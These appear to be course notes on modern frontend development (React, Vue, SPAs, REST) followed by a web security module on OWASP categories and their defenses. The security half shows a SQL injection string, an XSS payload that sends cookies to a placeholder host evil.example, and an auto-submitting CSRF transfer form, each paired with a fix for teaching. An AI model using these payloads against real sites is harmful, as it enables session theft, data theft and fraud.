From Static Pages to Rich Applications

Before frameworks, let us place them on the timeline. Earlier modules built static pages (Module 1), then dynamic pages (Module 5). This module covers the rich frontend application. The most important thing to remember: each stage still relies on the layer below it. A rich frontend app still sends HTTP requests and still renders HTML, just far more of it happens client-side.

Stage 1 — Static Page (Module 1)

The browser asks for /page.html and the server returns a finished HTML document. The document is fixed: nothing changes without a full reload.

Stage 2 — Dynamic Page (Module 5)

The browser requests a page (for example, on a click) and the server rebuilds the HTML fresh for every request. It is smarter than a static page, but a click still often means a full reload.

Stage 3 — Rich Frontend Application (this module)

After the first load, JavaScript owns the page. The browser fetches data, the server answers with a small JSON / HTML update, and JavaScript updates pieces of the page in place, with no full reload.

Note for Review — Pro-Tip: This "layers" idea is a favorite exam theme. Modern frontend is still HTML + CSS + JavaScript and still HTTP request-response underneath. What changed is who does the work and how much of the page is rebuilt.

Maya's TaskNest starts at Stage 1. Every time she ticks a task as done, the whole page reloads. Annoying. So she moves it up the ladder.

Events and the DOM Update Problem

Event Handling in Modern Frontends

Recall DOM manipulation: an event is anything that happens in the browser, such as a click, a keypress or a page load.

  • Imperative style (vanilla JS): select the element, then separately attach a listener to it.
  • Declarative style (frameworks): write the handler directly where the element is defined, e.g. onClick={...}.
  • The event itself has not changed. What has changed is how directly the handler is tied to the markup it belongs to.
Style How the handler is attached Example
Imperative (vanilla JS) Select the element, then attach a listener el.addEventListener(...)
Declarative (frameworks) Handler written where the element is defined onClick={...}

Why Frameworks? The DOM Update Problem

Earlier, every direct DOM change (textContent, appendChild, classList) was a manual instruction to the browser. In Module 3 this was fine, since it gave a good separation of concerns.

  • This gets fragile fast: a to-do app with 50 tasks means 50 places where state and the DOM can quietly drift out of sync. At the scale of modern web apps (millions of pages, fast responses expected), manually managing so many states and their matching UI elements is unrealistic. Each time state changes, you would have to remember every element it touches.
  • The framework promise: describe what the UI should look like for the current state, and let the framework figure out what actually needs to change.
  • That is the job of a rendering engine like React's virtual DOM.

The Virtual DOM

A virtual DOM is a lightweight, in-memory description of what the UI should look like, not the real browser DOM itself. Think of it as a digital twin of the page: you can experiment on the twin cheaply without touching the real thing.

On a state change the framework builds a new virtual DOM and compares ("diffs") it against the previous one. Then it applies only the minimal set of real DOM changes needed, instead of re-drawing everything. The developer does none of this; the framework automates it. This is what makes it safe to just "describe the UI for the current state" without worrying about manually patching the page yourself. The saving is largest when the change is incremental (a small difference between the old and new state).

Note for Review — Pro-Tip: Do not say "the virtual DOM is faster than the DOM". The precise claim is: it avoids many costly real-DOM operations by computing the smallest set of changes first. Svelte (below) shows you can reach a similar goal with no virtual DOM at all.

The Framework Landscape

Overview of Frontend Frameworks

Framework Origin Core idea
React Meta (Facebook), 2013 Components + JSX + a virtual DOM
Vue Evan You, 2014 HTML-like templates + a reactive data system
Angular Google, 2016 rewrite Full TypeScript-based framework, batteries included

All four solve the same core problem from different angles: keeping the UI in sync with data, without hand-written DOM code.

Large enterprises invest heavily in these frameworks (Google in Angular, Meta in React), which is why they are robust enough for large-scale business use

React at a Glance

In React, the whole task item is a function that receives text (the data), done (its status) and onToggle (the event handler). JSX mixes markup and JavaScript directly; curly braces {} drop back into plain JS, here to compute a style and read props. A click triggers onToggle, and the style draws a line through the text when the task is done.

// TaskItem.jsx
function TaskItem({ text, done, onToggle }) {
  return (
    <li onClick={onToggle}
        style={{ textDecoration: done ? 'line-through' : 'none' }}>
      {text}
    </li>
  );
}

Vue at a Glance

Vue keeps markup closer to plain HTML. @click binds an event, :class binds an attribute, and {{ }} inserts a value. The data (text, done) is declared with defineProps, and the event the component can raise is declared with defineEmits. The same task item, written in a different dialect.

<!-- TaskItem.vue -->
<template>
  <li @click="$emit('toggle')" :class="{ done: done }">
    {{ text }}
  </li>
</template>

<script setup>
defineProps(['text', 'done']);
defineEmits(['toggle']);
</script>

Framework choice is a trade-off exercise, not a search for one "best" answer. Which framework wins depends on your requirements, and on who has invested in it and how large its market is. A bigger ecosystem means more libraries and more jobs, while a steeper learning curve means a slower start.

Single-Page Applications

A single-page application (SPA) loads one HTML shell once, then uses JavaScript to update the page for every later interaction.

  • Traditional multi-page site (MPA): clicking a link asks the server for a whole new HTML page. That server round trip is a bottleneck for response time.
  • SPA: clicking a link runs JavaScript that fetches just the data it needs and re-renders part of the existing page.
  • Gmail, Google Maps and most modern dashboards are SPAs. Notice how the browser's loading spinner rarely appears after the first load.

MPA vs SPA: How Navigation Differs

Multi-page application (MPA): on every click the server sends back a whole new HTML page, so every navigation reloads the entire page.

Single-page application (SPA): the shell is loaded once, then only small JSON responses travel. The page itself never reloads; JS re-renders in place. The JSON is handled on the client side to rebuild just the fragment that needs to change, which saves a lot of overhead.

SPAs trade full page reloads for smaller, more frequent data requests handled entirely by client-side JavaScript.

APIs and REST

Frontend Apps Run on APIs

The "fetch JSON data" arrow in the SPA diagram is literally an API call from the browser to a server.

  • API (Application Programming Interface): a defined way for one program to ask another for data or actions, without needing to know how it is implemented internally. APIs give huge reusability: you do not rewrite a service from scratch each time.
  • In a web app, that "other program" is almost always a backend server, like the PHP or Node.js examples from Module 5. Many public APIs are also available and widely used.
  • What is new here? Not the request-response mechanism (Module 1) or the HTTP methods (already covered). It is how a frontend component uses that response to update itself. Each component carries its own MVC and calls the server's APIs, so updates become quick.
  • This is the missing link between component state (this module) and the database (Module 5).

REST: A Shared Convention for APIs

REST (Representational State Transfer) is a common style for designing APIs around resources, things like /api/tasks or /api/students, each identified by its own URL. It does not introduce new verbs or a new request-response mechanism. It just gives HTTP's existing methods a consistent, predictable meaning per resource, and keeps every request stateless: the server does not remember you between calls.

Request (quick recall, not new) REST meaning for /api/tasks
GET /api/tasks Read the full list of tasks
GET /api/tasks/5 Read one task by id
POST /api/tasks Create a new task
PUT /api/tasks/5 Replace/update task 5
DELETE /api/tasks/5 Delete task 5

JSON (JavaScript Object Notation) is the near-universal response format for REST APIs: lightweight, human-readable, and native to JavaScript's own object syntax.

Fetching and Rendering API Data

The same task list from Module 5, now rendered by a component instead of server-side HTML. useEffect runs once when the component first renders. fetch() calls the REST API, .json() parses the response body, and setTasks triggers a re-render with the real data. Notice key={t.id}: it gives each list item a stable identity so the virtual DOM can diff the list correctly.

// TaskList.jsx
import { useState, useEffect } from 'react';

function TaskList() {
  const [tasks, setTasks] = useState([]);

  useEffect(() => {
    fetch('/api/tasks')
      .then(res => res.json())
      .then(data => setTasks(data));
  }, []);

  return (
    <ul>
      {tasks.map(t => <li key={t.id}>{t.text}</li>)}
    </ul>
  );
}

Client-Side Routing and SPA Trade-offs

Client-Side Routing

An SPA still needs different "pages". A router is what makes /dashboard and /settings feel like separate pages without a reload.

The trick: the browser's History API lets JavaScript change the URL shown in the address bar without asking the server for a new page. The router's job: watch the URL, and swap in whichever component tree corresponds to it. Back and forward buttons still work as expected, because the router listens for those browser events too.

Because the framework automates all of this without direct user intervention, response time improves. But, as the second half of these notes shows, that automation also opens new security questions.

SPA Trade-offs: Benefits and Drawbacks

Point
Benefit Interactions feel instant once the app has loaded; only data moves, not whole pages
Benefit State (like an open sidebar or scroll position) survives navigation naturally
Drawback The first load can be heavier, since more JavaScript ships up front
Drawback Search engines and screen readers historically had a harder time with content that only appears after JS runs

Most production SPAs today mix in some server-side rendering specifically to soften that first drawback.

Beyond MVC: Component-Based Architecture

Recall Module 4's MVC: Model, View and Controller as three separate, global layers.

  • Component-based UI takes a different cut: each component bundles its own little Model (state), View (markup) and Controller (event handlers) together.
  • Why the shift: MVC assumes a fairly linear request-response cycle. Today's interactive UIs update dozens of times without any "request" at all. In classic MVC, every state change meant a lot of back-and-forth between Model and View. Components keep that conversation local.
  • Other patterns like MVVM (Vue, Angular) and MVI exist too. All are attempts to fit the same separation-of-concerns idea to highly reactive interfaces.

Data in a component tree is predictable because it flows in one direction: properties (props) go down from parent to child, and changes go back up as events. The parent owns the state; the child simply displays what it is given and reports what the user did.

Practical Scenario: The To-Do List as Components

Maya's TaskNest as components. useState holds the tasks. toggleTask(id) creates a new array in which only the matching task has done flipped, and setTasks triggers a re-render. Each TodoItem receives its data via {...t} and an onToggle handler. This is the same idea as the SQL UPDATE statement from the earlier to-do list, just triggered by a click instead of a form submit. Swap the hard-coded array for the fetch() call from the API section and it becomes a real, backend-driven app.

// TodoApp.jsx
function TodoApp() {
  const [tasks, setTasks] = useState([
    { id: 1, text: 'Buy milk', done: false }
  ]);

  function toggleTask(id) {
    setTasks(tasks.map(t =>
      t.id === id ? { ...t, done: !t.done } : t
    ));
  }

  return (
    <ul>
      {tasks.map(t => (
        <TodoItem key={t.id} {...t}
          onToggle={() => toggleTask(t.id)} />
      ))}
    </ul>
  );
}

Frontend Recap

  • Modern frontend development is still HTML, CSS and JavaScript, just organized around small, reusable components instead of one big page script.
  • A component bundles its markup, state and behaviour together; state changes trigger automatic re-renders instead of manual DOM edits.
  • Data flows down through props, and changes flow back up through events, keeping a large component tree predictable.
  • React, Vue, Angular and Svelte all solve the same UI-sync problem differently; none is universally "best".
  • A single-page application loads once and updates itself with JavaScript, trading full page reloads for client-side routing and data fetching.
  • Components talk to a backend (or a public provider) through REST APIs: resources, HTTP verbs already covered, and JSON as the shared data format.

Why Web Security Matters

Every module so far has built something that accepts input: forms (Module 3), queries (Module 5), requests (Module 6).

  • The uncomfortable truth: anything that accepts input from a user can potentially be made to accept input from an attacker instead.
  • The stakes: leaked passwords, stolen sessions, defaced pages, or an entire database exposed. Attackers may want to take over or cripple your system, or quietly take your data. Data is enormously valuable (industries are moving to data-driven decisions), so stealing it is both a privacy violation and a business loss.
  • Web apps involve constant two-party communication between a client and a remote server, over the web, which is inherently insecure. Someone can silently watch the traffic, or attack through the network or the system itself.
  • Security isn't a separate feature bolted on at the end. It is a property of how every earlier piece was built: your architecture, client-server communication, HTML, SQL queries and even cookies.

This module keeps to a focused set of attack scenarios: what is considered vulnerable, what can go wrong, and what the fixes are.

Common Web Vulnerabilities at a Glance

  • Injection (A05): untrusted input is interpreted as code or commands instead of plain data. SQL injection and XSS both live here. It happens without the user's knowledge, hence "injection".
  • Authentication failures (A07): weak, guessable, or poorly protected login mechanisms. Login is how we tell clients apart to give them different privileges, personalized services and so on, which makes it the most common way into a system.
  • Broken access control (A01): a user can do or see something they were never authorized to. Servers hold many resources, and not every client may touch everything.
  • Cryptographic failures (A04): sensitive data left unencrypted, in transit or at rest. Encryption forces an attacker to spend significant compute time and effort; without it, reading the data is trivial.
  • Notice the pattern: almost every category comes down to trusting something that shouldn't have been trusted.

Note for Review — Pro-Tip: The Top 10 is a ranking, so A03 (supply chain), appears later in these notes too, under "keep dependencies updated". Memorize the four focus categories with their codes: A01, A04, A05, A07.

SQL Injection

The Idea

Recall Module 5: a SQL query is just a string the backend sends to the database.

  • The vulnerability: if user input is pasted directly into that string, the user can write part of the query themselves.
  • The attack: carefully crafted input changes the query's meaning entirely, often to bypass a check or read data it should not.
  • This is the textbook example of Injection (OWASP A05), and one of the most well-known vulnerabilities in web history.

A Worked Example

The backend builds the query by string concatenation. The query code never changes; only the variable userInput does, and it may come from anywhere (a form, a file). If an attacker enters the malicious input shown below, the query becomes ... WHERE name = '' OR '1'='1'. Because '1'='1' is always true, the condition holds for every row, so it returns every row in the table, not just one instructor.

// vulnerable.js
// VULNERABLE -- string concatenation
const query =
  "SELECT * FROM instructor WHERE name = '"
  + userInput + "';";

If an attacker enters this as userInput:

' OR '1'='1

In Boolean terms, for any condition P (here, the name check):

P∨true≡true

So the WHERE filter no longer filters anything. The query was meant to be constrained to matching rows, but the attacker can now read all client data stored in the database.

Defense: Parameterized Queries

The value is passed as a parameter, never as part of the query text. The ? placeholder is filled in by the database driver. This is exactly the pattern Module 5's PHP and Node.js examples already used: the database driver keeps user data and SQL syntax strictly separate, so a malicious string can never be reinterpreted as code.

// safe.js
// SAFE -- the value is a parameter,
// never part of the query text
const [rows] = await conn.execute(
  'SELECT * FROM instructor WHERE name = ?',
  [userInput]
);

Note for Review — Pro-Tip: "Sanitizing quotes by hand" is not the expected answer on an exam. The expected answer is parameterized (prepared) queries: the query structure is fixed first, and data is supplied separately.

Cross-Site Scripting (XSS)

The Idea

Recall Module 3: innerHTML inserts a string directly as live HTML on the page.

  • The vulnerability: if that string comes from another user's input (a comment, a profile name) and isn't sanitized, it can contain a <script>.
  • The attack: that script runs in the victim's browser, with the victim's cookies and session, not the attacker's. The attacker can then act as an imposter of that client.
  • This is Injection (A05) again, just landing in the browser's HTML parser instead of a database engine.

A Worked Example

The code puts a user's comment straight into the page with innerHTML. The attacker posts an <img> whose source (x) is invalid, so the image fails to load, and the browser quietly fires its onerror handler. Instead of a harmless caption, the handler runs the attacker's script, which sends the visitor's session cookie to the attacker. Every later visitor's session cookie goes straight to them. (The domain evil.example is a deliberate placeholder.)

// vulnerable.js
// VULNERABLE
document.getElementById('comments')
  .innerHTML = userComment;

If an attacker posts this as userComment (course illustration):

<img src=x onerror="fetch('https://evil.example/steal?c='
  + document.cookie)">

Types of XSS

Type How it happens
Stored The malicious script is saved on the server (e.g. in a comment) and served to every later visitor
Reflected The script is bounced straight back in a URL parameter's echoed response; the victim has to click a crafted link
DOM-based Client-side JavaScript itself inserts untrusted data into the page; the server is never even involved

All three share the same root cause: untrusted data ends up somewhere the browser will execute it as code.

Defending Against XSS

  • Prefer textContent over innerHTML: textContent always treats its argument as plain text, never as markup to parse.
  • Escape or sanitize any HTML you must allow: convert <, > and & into their safe entity equivalents (for example &lt;, &gt;, &amp;) before inserting.
  • Frameworks help by default: React, for instance, escapes values automatically unless you explicitly opt out.
  • Content-Security-Policy: an HTTP header that tells the browser which script sources are allowed to run at all. The server can build an allow-list (or block-list) of script sources this way.

Authentication vs Authorization

Recall Module 5:

  • Authentication answers *"Who are you?"*
  • Authorization answers *"What are you allowed to do?"*

Authentication failures (OWASP A07) are weaknesses in verifying identity in the first place. Broken access control (OWASP A01) is currently the single most common category found in testing, and is a failure of the second question. A system can authenticate someone perfectly and still be broken, if it never checks whether they are authorized for what they are requesting.

Common Authentication Weaknesses

  • Weak or reused passwords: a password breached on one site is immediately tried against others (credential stuffing). Easily guessed passwords (short, or based on a birth date or favourite topic) fall quickly. This is why sites ask you to change passwords periodically.
  • No rate limiting: without a limit on login attempts, an attacker can simply guess passwords automatically, spending computing resources until one works.
  • Missing multi-factor authentication: a stolen password alone is enough to get in. Adding an OTP or SMS code (two-factor or more) raises the bar.
  • Predictable password-reset flows: a guessable reset link or security question can bypass the password entirely.
  • Module 5's hashing and salting defend the stored password. These weaknesses live earlier, in how login itself is designed.

Broken Access Control: A Closer Look

  • Being logged in only proves who you are. The server must separately check what that identity is allowed to touch.
  • Insecure Direct Object Reference (IDOR): a classic example: /invoice?id=1002 works, so a user simply tries id=1003.
  • The failure: if the server fetches whatever ID is asked for without checking it belongs to the current session, that request succeeds.
  • The fix is simple to state and easy to forget: every request that touches a specific record must confirm the current user is allowed to touch that record. Server-side checks are added on top of any client-side logic.

Note for Review — Pro-Tip: "A user is logged in" is not an authorization check. When an exam scenario says the attacker used their own valid session, think A01 / IDOR, not A07.

Same-Origin Policy and CORS

  • Same-origin policy: by default, a browser blocks JavaScript on one site from reading responses from a different site.
  • Why it matters: without it, a malicious page could quietly use your logged-in session to read your email or bank data from another tab.
  • CORS (Cross-Origin Resource Sharing): a set of response headers a server uses to explicitly allow specific other origins to call its API. The same-origin policy is the browser-side protection; CORS is the server-side way to open controlled exceptions.
  • This is the policy quietly at work every time an API call from one domain to another succeeds, or is mysteriously blocked.

HTTPS and the TLS Handshake

HTTPS and Secure Communication

  • Recall Module 1: HTTP is plain text; HTTPS wraps it in TLS (Transport Layer Security) encryption.
  • Without HTTPS: passwords, session cookies and page content all travel across the network exactly as typed.
  • This is Cryptographic Failure (A04): one of OWASP's top categories, and one of the simplest to eliminate entirely.
  • Every login form, every cookie, every API call from earlier modules assumes this layer is doing its job underneath.

HTTP vs HTTPS: What an Eavesdropper Sees

An eavesdropper silently watches the conversation between client and server. On plain HTTP, they read the username, password and session id directly. On HTTPS they see only unreadable ciphertext. Anyone on the same network, a public Wi-Fi hotspot or a compromised router, can read plain HTTP traffic; TLS makes the same traffic unreadable in transit. Ciphertext is produced by a hard cryptographic function, so turning it back into readable data is very expensive without the key.

The TLS Handshake, Simplified

The handshake is always client-initiated. The browser announces which encryption it supports, the server replies with a certificate (typically carrying its public key) that proves its identity, and the browser checks that certificate. If something is wrong on the server side, the client finds out here. Both sides then derive a shared secret key, valid only for this client-server pair and this session, and all further traffic is encrypted with that key. The handshake happens once per connection, in milliseconds, before a single byte of your actual data is sent.

Note for Review — Pro-Tip: Keep the roles straight: the certificate proves who the server is; the shared secret key is what actually encrypts the data. Also, hash functions (like SHA) and encryption are different things: a hash is one-way (used for stored passwords), while encryption is reversible with the key (used for traffic). The five steps shown here are a teaching simplification of the real protocol.

Secure Cookies and Security Headers

Secure Cookies, Revisited

Cookies retain state over stateless HTTP, remembering preferences and sessions, but they also open an attack surface. Module 5 introduced cookie attributes as features. Here they are read as specific defenses.

Attribute Defends against How
Secure Network eavesdropping Refuses to send the cookie over plain HTTP
HttpOnly XSS specifically Even an injected script can't read a cookie marked HttpOnly
SameSite Cross-site request forgery (CSRF) Limits when the cookie is sent on requests from other sites

Three attributes, three different attack categories. None of them are optional for a real login session.

Security Headers: A Quick Tour

These are HTTP response headers the server sends to tell the browser how to behave. Content-Security-Policy limits which script sources the browser will run at all, a strong second line of defense against XSS. X-Content-Type-Options stops the browser from "guessing" a file's type in a way attackers can abuse (nosniff means: do not guess). X-Frame-Options blocks the page from being embedded in another site's invisible frame (clickjacking). Strict-Transport-Security tells the browser to only ever use HTTPS for this site from now on, for a maximum age.

# response-headers.http
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=63072000

The max-age is in seconds. Check the value:

2×365×24×3600=63,072,000 seconds=2 years

Secure Coding Practices

Input Validation

Recall Module 3's form validation: that was about user experience, catching mistakes before they are submitted.

  • The security version is different: client-side validation is a convenience, never a defense. It runs in the attacker's own browser, which they fully control.
  • The rule: validate and sanitize again on the server, every time, no matter what the client already checked. This adds a little cost per request but makes the system safer.
  • Prefer allow-lists ("only these characters/formats are valid") over block-lists ("block these known-bad patterns"). Attackers are creative about what a block-list misses.

Least Privilege and Defense in Depth

  • Principle of least privilege: give every account, process and database user only the access it strictly needs. Start with nothing and add privileges as required, which is stricter than starting broad and removing.
  • Example: the database user an application connects with, using a schema like Module 5's, shouldn't have permission to drop tables.
  • Defense in depth: layer multiple independent defenses, so one failure (a missed validation, a leaked credential) doesn't mean total compromise.

Parameterized queries, hashed passwords, HTTPS and least privilege together are exactly this kind of layering. An attacker has to defeat every layer in turn, so even if one is compromised the others remain intact.

Dependencies and Secrets

  • Keep dependencies updated: a vulnerability found in a popular package (OWASP's Software Supply Chain Failures, A03) becomes everyone's problem who uses it. Limiting third-party dependencies also helps.
  • Never hardcode secrets: API keys, database passwords and tokens should never appear directly in source code.
  • Use environment variables or a secrets manager instead: this is exactly why .env files are excluded from version control. The code reads the secret through a variable at runtime.
  • A perfectly secure login flow is still broken the moment its database password is sitting in a public GitHub repository.

Practical Scenarios: Attacks and Fixes

Scenario 1 — Broken Access Control (IDOR)

Alice views her own invoice (id=1002) with her own session cookie. She then edits the URL to a neighbouring id. The server answers 200 OK, and Bob's invoice comes back anyway. Fix: every handler that loads a record by id must check, server-side, that the record's owner matches the current session, not just that a valid session exists. Never trust that a user will only ever ask for their own ids.

Scenario 2 — Cross-Site Request Forgery (CSRF)

The victim is already logged into bank.example in another tab. They load a page the attacker controls, which holds a hidden form and a script that auto-submits it. The browser attaches the session cookie automatically to any request to that domain, including this hidden one, so the bank sees a "legitimate" transfer. Fix: mark the session cookie SameSite=Lax or Strict (already covered) so it isn't sent on cross-site requests, and require a CSRF token: a random value the real form must echo back, which the evil page could never know.

The attacking page (course illustration):

<!-- evil-site.html -- the victim just has to load this page -->
<form action="https://bank.example/transfer"
      method="POST" id="f">
  <input name="to" value="attacker-account">
  <input name="amount" value="5000">
</form>
<script>document.getElementById('f').submit();</script>

Scenario 3 — An Unprotected API Endpoint

In TaskItem.jsx, the delete button is hidden from regular users with {isAdmin && <button onClick={deleteTask}>Delete</button>}. But hiding a button is a frontend decision, not a security control. A regular user simply calls the endpoint directly, for example with curl, no button needed. Fix: check authorization on the server for every request to /api/tasks/5, regardless of whether it came from a click or a hand-crafted request, and add rate limiting, so even authorized calls can't be hammered thousands of times a second.

Scenario 4 — Securing the Login Flow

The same walkthrough from Module 5, now read as a checklist of where a login flow can be attacked and what defends each step. Credentials travel over HTTPS (so they are encrypted in transit). The server hashes the submitted password and compares it to the stored hash, never storing or reading plaintext. The query is parameterized, so it is immune to SQL injection. The session cookie is set with Secure; HttpOnly; SameSite=Lax. Later requests carry it automatically over HTTPS, and every page that shows account data checks whether this session is allowed to see it (authorization).

Note for Review — Pro-Tip: IDOR, CSRF and the unprotected endpoint are the same lesson three times: never trust a check the client can bypass. Verify ownership, tokens and authorization again on the server.

Security Recap

  • The OWASP Top 10 is the industry's shared map of what actually gets exploited. This module focused on injection, authentication, access control and cryptographic failures.
  • SQL injection and XSS are both injection attacks: untrusted input reinterpreted as code, in a database engine or a browser respectively. Parameterized queries and proper escaping defend against each.
  • Authentication (who you are) and authorization (what you can do) are separate checks, and both must hold for every request.
  • HTTPS/TLS protects data in transit; Secure, HttpOnly and SameSite cookies each defend against a distinct attack.
  • Secure coding is mostly discipline: validate on the server, grant least privilege, keep dependencies current, and never hardcode a secret.
  • IDOR, CSRF and an unprotected API endpoint are the same lesson three times over: never trust a check the client can bypass; verify ownership, tokens and authorization again on the server.

The big picture: a good web application needs responsive design (users shouldn't feel they are waiting), performance (millions of clients, cost), and security, which has to be ensured from the start. These topics reach down into operating systems, networks and cryptography, so keep exploring them beyond this course and apply them in your assignments, lab experiments and professional work.
